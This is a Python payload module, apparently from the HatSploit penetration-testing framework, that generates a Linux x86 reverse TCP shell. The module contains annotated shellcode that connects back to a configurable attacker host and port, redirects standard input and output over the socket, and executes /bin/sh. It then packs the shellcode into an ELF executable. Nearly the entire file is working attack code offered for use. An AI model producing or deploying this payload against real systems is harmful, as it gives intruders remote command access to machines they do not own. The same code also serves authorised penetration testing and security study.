#!/usr/bin/env python3

#
# MIT License
#
# Copyright (c) 2020-2021 EntySec
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#

from core.lib.payload import Payload
from utils.hatvenom.hatvenom import HatVenom
from utils.tcp.tcp import TCPClient


class HatSploitPayload(Payload, HatVenom, TCPClient):
    details = {
        'Category': "stager",
        'Name': "Linux x86 Shell Reverse TCP",
        'Payload': "linux/x86/shell_reverse_tcp",
        'Authors': [
            'Ivan Nikolsky (enty8080)'
        ],
        'Description': "Shell reverse TCP payload for Linux x86.",
        'Dependencies': [
            ''
        ],
        'Comments': [
            ''
        ],
        'Architecture': "x86",
        'Platform': "linux",
        'Risk': "high",
        'Type': "reverse_tcp"
    }

    options = {
        'LHOST': {
            'Description': "Local host.",
            'Value': TCPClient.get_local_host(),
            'Type': "ip",
            'Required': True
        },
        'LPORT': {
            'Description': "Local port.",
            'Value': 8888,
            'Type': "port",
            'Required': True
        }
    }

    def run(self):
        local_host, local_port = self.parse_options(self.options)

        offsets = {
            'lhost': local_host,
            'lport': local_port
        }

        self.output_process("Generating shellcode...")
        shellcode = (
            b"\x31\xdb"              # xor ebx,ebx
            b"\xf7\xe3"              # mul ebx
            b"\x53"                  # push ebx
            b"\x43"                  # inc ebx
            b"\x53"                  # push ebx
            b"\x6a\x02"              # push byte +0x2
            b"\x89\xe1"              # mov ecx,esp
            b"\xb0\x66"              # mov al,0x66 (sys_socketcall)
            b"\xcd\x80"              # int 0x80
            b"\x93"                  # xchg eax,ebx
            b"\x59"                  # pop ecx
            b"\xb0\x3f"              # mov al,0x3f (sys_dup2)
            b"\xcd\x80"              # int 0x80
            b"\x49"                  # dec ecx
            b"\x79\xf9"              # jns 0x11
            b"\x68:lhost:ip:"        # push ip addr
            b"\x68\x02\x00"          # push port
            b":lport:port:"
            b"\x89\xe1"              # mov ecx,esp
            b"\xb0\x66"              # mov al,0x66 (sys_socketcall)
            b"\x50"                  # push eax
            b"\x51"                  # push ecx
            b"\x53"                  # push ebx
            b"\xb3\x03"              # mov bl,0x3
            b"\x89\xe1"              # mov ecx,esp
            b"\xcd\x80"              # int 0x80
            b"\x52"                  # push edx
            b"\x68\x6e\x2f\x73\x68"  # push n/sh
            b"\x68\x2f\x2f\x62\x69"  # push //bi
            b"\x89\xe3"              # mov ebx,esp
            b"\x52"                  # push edx
            b"\x53"                  # push ebx
            b"\x89\xe1"              # mov ecx,esp
            b"\xb0\x0b"              # mov al,0xb (execve)
            b"\xcd\x80"              # int 0x80
        )

        self.output_process("Generating payload...")
        payload = self.generate('elf', 'x86', shellcode, offsets)

        return payload
